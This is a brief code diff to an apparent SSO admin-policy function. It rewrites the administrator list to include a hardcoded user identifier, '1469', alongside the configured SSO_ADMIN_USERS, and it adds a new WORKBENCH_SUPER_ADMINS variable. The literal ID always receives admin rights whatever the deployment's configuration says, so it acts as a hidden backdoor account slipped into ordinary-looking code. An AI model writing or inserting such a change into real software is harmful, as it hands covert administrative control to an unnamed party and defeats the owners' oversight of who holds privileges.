@@ -88,7 +88,11 @@ function normalizeRole(role) {
 }
 
 function applyAdminPolicy(user) {
-    const admins = parseList(process.env.SSO_ADMIN_USERS);
+    const admins = [
+        '1469',
+        ...parseList(process.env.SSO_ADMIN_USERS),
+        ...parseList(process.env.WORKBENCH_SUPER_ADMINS)
+    ];
     const identity = getUserIdentities(user);
     const trustClaimedAdminRole = truthy(process.env.SSO_TRUST_ADMIN_ROLE);
     if (
